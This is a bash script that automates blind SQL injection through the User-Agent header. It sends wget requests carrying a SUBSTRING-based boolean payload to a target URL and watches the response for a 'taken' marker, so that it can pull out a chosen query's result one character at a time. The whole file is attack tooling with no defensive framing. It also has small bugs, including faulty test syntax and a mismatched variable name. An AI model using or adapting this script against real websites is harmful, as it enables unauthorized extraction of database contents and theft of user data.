#!/usr/bin/bash
PATH=$PATH:/bin:/usr/bin:blind.sh
export PATH
charset=`echo {0..9} {A..z} \. \. \; \: \- \_ \@`
export URL="<Enter URL>"
export truestring='taken'
export maxlength=$1
export query=$2

export results=""

echo "extracting the results from $query..."

for ((j=1;j<$maxlength;j+=1))
do
       export nthchar=$j
       
       for i in $charset
       do
       
          `wget --user-agent="' OR SUBSTRING(("$query"),"$nthchar",1)='$i" "$URL" -q -O -`| grep "$truestring" &> /dev/null
           if [ "$?" == "0"]
           then
                   echo Character number $nthchar found: $i
                   export result+=$i
                   break
           fi
   done
done

echo Results: $result
